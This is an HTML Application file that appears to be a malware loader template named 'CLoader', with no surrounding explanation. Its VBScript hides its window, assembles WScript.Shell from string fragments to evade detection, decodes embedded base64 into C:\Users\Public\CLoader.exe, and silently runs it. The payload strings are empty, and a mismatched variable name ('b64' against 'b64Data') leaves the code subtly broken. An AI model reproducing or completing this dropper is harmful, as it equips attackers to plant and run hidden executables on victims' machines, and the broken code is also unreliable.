<html>
<head>
<HTA:APPLICATION ID="loader" APPLICATIONNAME="CLoader" BORDER="thin" BORDERSTYLE="normal" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize">
<script language="VBScript">
On Error Resume Next

a = Array("W", "Scr", "ipt.", "She", "ll")
Set z = CreateObject(Join(a, ""))

Dim b64Data
b64Data = ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""

Function x(b)
      Set x1 = CreateObject("Microsoft.XMLDOM")
      Set x2 = x1.createElement("tmp")
      x2.DataType = "bin.base64"
      x2.Text = b
      x = x2.NodeTypedValue
    End Function

    Set s = CreateObject("ADODB.Stream")
    s.Type = 1
    s.Open
    s.Write x(b64)
    f = "C:\Users\Public\CLoader.exe"
    s.SaveToFile f, 2
    z.Run f, 0, False
  </script>
</head>
<body></body>
